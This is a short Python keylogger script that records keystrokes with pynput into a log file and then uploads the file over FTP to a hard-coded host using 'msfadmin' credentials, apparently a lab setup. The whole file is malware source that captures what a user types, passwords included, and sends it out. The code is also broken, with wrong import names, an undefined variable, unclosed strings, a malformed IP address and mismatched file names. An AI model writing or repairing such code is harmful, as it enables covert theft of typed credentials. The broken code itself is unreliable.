from pynput.keyboard import key, Listeners
import ftplib
import logging

logger = ""

logging.basicConfig(filename=logdir+"klog-rest.txt",level=logging.DEBUG,format,="%(asctime)s:%(message)s%"

def pressing_key(key):
	try:
		logging.info(str(Key))
	except AttributeError:
		print("A special key {0} has been pressed".format(key))

def releasing_key(key):
	if key == Key.esc:
		return false

print("\nStarted listening ...\n)

with Listener(on_press=pressing_key, on_release=releasing_key) as listener
	listener.join()
	
print ("\nConnecting to the FTP and sending the data ..")
sess = ftplib.FTP("192.168..148","msfadmin","msfadmin")

file = open("klog-res.txt","rb")
sess.storbinary("STOR klog-res.txt",file)
file.close()
sess.quite()
